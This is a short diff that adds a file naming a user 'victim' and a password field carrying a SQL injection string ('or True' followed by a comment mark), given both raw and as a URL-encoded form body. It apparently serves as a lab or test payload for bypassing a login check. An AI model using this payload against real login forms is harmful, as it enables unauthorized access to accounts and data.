@@ -1,0 +1,5 @@
+USERNAME=victim
+PASSWORD=thing\' or True; #
+username=victim&password=thing%5C%27%20or%20True%3B%20%23
+
+
